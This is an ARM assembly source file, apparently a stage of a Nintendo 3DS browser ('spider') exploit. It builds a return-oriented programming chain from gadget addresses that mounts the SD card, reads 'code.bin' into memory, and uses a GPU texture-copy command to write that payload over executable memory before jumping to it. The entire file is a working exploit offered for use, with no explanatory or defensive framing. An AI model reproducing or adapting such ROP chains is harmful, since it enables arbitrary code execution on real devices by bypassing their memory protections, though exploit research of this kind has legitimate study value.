	.arm
	.text

#include "spider_rop.h"

#define BUFFER_LOC 0x18410000
#define CODE_SIZE 0x00004000
#define CODE_JUMP 0x009D2000

	.global	_start
@---------------------------------------------------------------------------------
_start:
	@ mount SD
		.word POP_R0_PC, DMC
		.word FS_MOUNTSDMC_LDMFD_SP_R3_4_5_PC, GARBAGE, GARBAGE, GARBAGE
	@ open file
		.word POP_R0_1_2_3_4_7_PC, THIS, SPIDER_ROP_LOC+FileName, FILE_READ, GARBAGE, GARBAGE, GARBAGE
		.word IFile_Open_LDMFD_SP_R4_5_6_7_PC, GARBAGE, GARBAGE, GARBAGE, GARBAGE
		.word POP_PC
	@ read payload
		.word POP_R0_1_2_3_4_7_PC, THIS, THIS+0x20, BUFFER_LOC, CODE_SIZE, GARBAGE, GARBAGE
		.word IFile_Read_LDMFD_SP_R4_5_6_7_8_9_PC, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE
	@flush data cache
		.word POP_R0_1_2_3_4_PC, HANDLE_PTR, KPROCESS_HANDLE, BUFFER_LOC, CODE_SIZE, GARBAGE
		.word POP_LR_PC, POP_PC
		.word GSPGPU_FlushDataCache
	@send GX command
		.word POP_R0_PC, nn__gxlow__CTR__detail__GetInterruptReceiver+0x58
		.word POP_R1_PC, SPIDER_ROP_LOC+gxCommand
		.word POP_LR_PC, POP_PC @ lr (pop pc)
		.word nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue
	@sleep for a bit
		.word POP_R0_PC, 1000000000 @ r0 (one second)
		.word POP_R1_PC, 0x00000000 @ r1 (nothing)
		.word POP_LR_PC, POP_PC @ lr (pop pc)
		.word SVC_0A_BX_LR
       	@ jump to code
		.word CODE_JUMP

	.fill 4, 4, GARBAGE
	.word SPIDER_ROP_LOC+_start+0x8C
	.fill 12, 4, GARBAGE
	.word SPIDER_ROP_LOC+_start, GARBAGE, POP_PC
gxCommand:
	.word 0x00000004 @ command header (SetTextureCopy)
	.word BUFFER_LOC @ source address
	.word CODE_TARGET @ destination address
	.word CODE_SIZE @ size
	.word 0xFFFFFFFF @ dim in
	.word 0xFFFFFFFF @ dim out
	.word 0x00000008 @ flags
	.word 0x00000000 @ unused

	.word GARBAGE, POP_PC, POP_PC
FileName:
	.string16 "dmc:/code.bin"
	.fill 80, 2, 0
	.word MAGIC
